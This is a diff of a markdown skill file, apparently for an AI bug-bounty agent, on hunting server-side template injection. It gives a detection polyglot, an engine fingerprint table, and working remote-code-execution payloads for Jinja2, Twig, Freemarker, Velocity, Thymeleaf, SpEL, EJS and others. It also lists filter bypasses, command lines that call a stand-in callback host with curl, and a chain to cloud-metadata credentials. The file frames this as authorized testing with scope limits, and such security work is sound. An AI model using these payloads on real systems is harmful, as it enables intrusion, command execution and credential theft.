@@ -3,51 +3,113 @@ name: hunt-ssti
 description: "Hunt server-side template injection (SSTI) across Jinja2 (Flask/Django), Twig (Symfony), Freemarker (Java), ERB (Rails), Spring, Velocity, Mako, Thymeleaf, Smarty. Detection probes use double-curly and dollar-curly math expressions evaluated server-side. Once an engine is fingerprinted, escalate to RCE via the engine-specific class-walker, callback-registrar, or Execute-utility patterns documented in disclosed reports. Detection patterns: error messages reveal engine, blank or numeric eval reveals expression mode. Targets: email templates, PDF/report generators, CMS preview features, error pages with user input. Use when hunting RCE via template rendering, when content shows engine fingerprints, when finding endpoints that compose strings with user input before render."
 ---
 
-## 14. SSTI — SERVER-SIDE TEMPLATE INJECTION
-> Easy to detect, high payout ($2K–$8K). Direct path to RCE.
+# HUNT-SSTI — Server-side template injection
 
-### Detection Payloads (try all)
+The server concatenates user input into a template string and **renders** it. `{{7*7}}` → `49` in a **curl** body is detection. It is not RCE. Client-side Angular/Vue also evaluate `{{7*7}}` in the browser — if curl returns the payload unchanged, it is not this bug.
+
+## Rails
+- In-scope only. One probe per sink, then one impact payload.
+- No resource-burning loops inside templates (`range(10**9)`, billion-laughs strings, fork bombs).
+- No reverse shell and no file drop. Proof is `id`/`whoami` in the response or a single OOB callback whose path contains that output.
+- Sandboxed render (`49` but every RCE gadget throws) is SSTI, not Critical RCE. Say which.
+- Stop at draft. Never auto-submit.
+
+## Decision tree
+
+1. **Find render sinks, not just reflected parameters.** Email subject/body, PDF/invoice, CMS preview, theme/widget, notification, error page, markdown that is re-rendered server-side, filename passed to `render()`, SMS/Slack template, SSO error text.
+2. **curl the polyglot** (do not use a browser):
+   ```
+   {{7*7}}${7*7}<%=7*7%>#{7*7}*{7*7}{{7*'7'}}
+   ```
+3. **Classify from the raw response:**
+
+   | You see | Engine family | Next probe |
+   |---|---|---|
+   | `49` and `7777777` | Jinja2 (Python `str*int`) or Nunjucks only if `7777777` — Nunjucks/JS coerces `'7'*7` to **49** | `{{config}}` / `{{self}}` |
+   | `49` and the `*'7'` site is also `49` | Twig, Blade (`{{ }}` is PHP), Pebble | `{{_self}}` / `{{app}}` |
+   | `${7*7}` → `49`, braces unchanged | Freemarker, Spring EL, Mako | error text names which |
+   | `<%=7*7%>` → `49` | ERB or EJS | stack trace or `process` vs backtick |
+   | `*{7*7}` → `49` | Thymeleaf selection (often only inside a template attribute) | `[[${7*7}]]` |
+   | `{7*7}` → `49` | Smarty | `{php}` only if the error says Smarty 2 / security off |
+   | Payload unchanged in curl, `49` only in a browser | Client template (AngularJS/Vue). Not SSTI | `hunt-xss` / CSTI |
+   | Go `{{7*7}}` unchanged | `text/template` has no math. Try `{{printf "%s" .}}` | RCE only if a FuncMap exposes exec |
+   | Engine error (`jinja2.exceptions`, `Twig\\Error`, `freemarker.core`, `org.thymeleaf`, `TemplateSyntaxError`, `velocity`) | Sink confirmed even when math was filtered | Use the syntax the error accepts |
+
+4. **Escalate with that engine's gadget.** If the gadget throws a security/sandbox error, try the attr/filter bypass once. If that throws too, report sandboxed SSTI with the `49` evidence — do not claim RCE.
+5. **Blind sinks** (email, queue, PDF you never see): one OOB payload (`curl http://UNIQUE.collab/` or a 2s sleep) and poll. n≥10 only for the timing channel.
+6. **Second order:** the field that stores "template source" (signature, theme, invoice note) is the sink even when the save response is clean. Trigger preview/send.
+
+## RCE gadgets
+
+Use a unique host `UNIQUE.collab`. Replace `id` with `id|curl http://UNIQUE.collab/` when the render output is not returned.
+
+**Jinja2** — context objects first; do not hardcode a `.__subclasses__()[N]` index (it moves every Python release).
 ```
-{{7*7}}          → 49 = Jinja2 / Twig
-${7*7}           → 49 = Freemarker / Velocity / Mako (all use ${...})
-<%= 7*7 %>       → 49 = ERB (Ruby)
-*{7*7}           → 49 = Spring Thymeleaf
-{{7*'7'}}        → 7777777 = Jinja2 (Python string repetition); 49 = Twig (numeric coercion of '7'). Differentiates Jinja2 from Twig.
-```
-
-### RCE Payloads
-
-**Jinja2 (Python/Flask):**
-```python
+{{lipsum.__globals__.os.popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 ```
-
-**Twig (PHP/Symfony):**
-```php
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+Filter bypass when `.` and `_` are stripped:
 ```
-
-**ERB (Ruby):**
-```ruby
-<%= `id` %>
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
 ```
+Statement form if `{{` is encoded and `{%` is not: `{% print(lipsum.__globals__.os.popen('id').read()) %}`.
 
-### Where to Test
+**Twig** — `_self.env.registerUndefinedFilterCallback("exec")` then `getFilter("id")` is the legacy chain (removed on current Twig). Try, then:
 ```
-Name/bio/description fields, email templates, invoice name, PDF generators,
-URL path parameters, search queries reflected in results, HTTP headers reflected
+{{['id']|filter('system')}}
+{{['id']|map('system')}}
+{{['id']|reduce('system')}}
 ```
+Sandbox exception → stop at SSTI, not RCE. `{{include('http://UNIQUE.collab/')}}` is SSRF evidence if it fetches.
 
----
+**Freemarker**
+```
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+${"freemarker.template.utility.Execute"?new()("id")}
+```
+`?api` on a Java object is the newer method-access path when `?new` on `Execute` is blocked. One command.
 
-## Related Skills & Chains
+**Velocity**
+```
+#set($rt=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
+```
+If `$class` is absent, the math probe may still be Freemarker — trust the exception class.
 
-- **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
-- **`hunt-xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
-- **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
-- **`hunt-file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
-- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
-- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.
+**Thymeleaf (Spring view-name injection, not a random HTML field)**
+```
+__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
+```
+Detection in an expression: `*{7*7}` or `[[${7*7}]]`. `exec` does not return stdout — confirm with OOB (`curl`/`ping` is unnecessary; one HTTP callback).
+
+**Spring EL / SpEL** (header or query that reaches `parseExpression`, including Spring Cloud Function `spring.cloud.function.routing-expression` on old 3.1/3.2):
+```
+${T(java.lang.Runtime).getRuntime().exec("curl http://UNIQUE.collab/")}
+```
+A DNS hit proves evaluation. Claim RCE only with a callback you can tie to the command.
+
+**Mako:** `${self.module.cache.util.os.popen("id").read()}`. **ERB:** `<%= IO.popen('id').read %>`. **EJS:** `<%= process.mainModule.require('child_process').execSync('id') %>`. **Nunjucks:** `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}`. **Smarty (legacy `{php}` or `{system('id')}`):** only if the error banner is Smarty; Smarty 3+ security policy blocks `{php}`. **Pebble / Liquid / Handlebars:** `49` or a dump is the bug; they do not expose a portable RCE gadget — do not invent one. **Go `text/template`:** RCE only through a dangerous FuncMap (`exec`, `env`); `html/template` escaping is XSS (`hunt-xss`), not SSTI RCE.
+
+## Bypasses
+- Quote and concat: `{{'os'.__class__}}` variants, `attr('\x5f\x5fclass\x5f\x5f')`.
+- `{{request.args.a}}` then pass the gadget as `?a=` so the payload is not in the stored template.
+- Newlines / `{%` … `%}` when `{{` is filtered.
+- Unicode escapes in JSON templates (`\u007b\u007b`).
+- PDF/HTML engines that strip `{{` but pass `${}` (or the reverse) — send the polyglot so one request fingerprints this.
+
+## Validation
+- **Detection:** curl body contains `49` / `7777777` and does not contain the probe literal. Or a template-engine stack trace caused by the probe.
+- **RCE:** response contains the `uid=` / `whoami` line, **or** one OOB request whose query/path includes that output (unique hostname per sink).
+- **Sandbox:** `49` plus a security exception on every gadget. Severity stays below RCE. Stored XSS via the same sink is `hunt-xss` if HTML is rendered to another user.
+- **Not a finding:** browser-only `49`, reflected `{{7*7}}` unchanged, math evaluated in your own markdown preview that only you can open (self-impact — say so and drop unless another user renders it).
+
+## Chains
+- **`hunt-rce`** — gadget above returned command output. That is the RCE report; do not file a second theoretical one.
+- **`hunt-xss`** — sandboxed engine still emits unsanitized HTML into an email or a shared preview.
+- **`hunt-ssrf`** — `include` / `from_file` / Freemarker `?url` fetches your host or `169.254.169.254`. IMDSv2 needs a PUT token; a GET that returns 401 is reachability, not cloud keys.
+- **`hunt-file-upload`** — office/HTML/SVG upload re-rendered by a template. The payload lives in the file the parser extracts (DOCX `word/document.xml`, an HTML invoice).
 
 ## Before you report — dedup gate
 
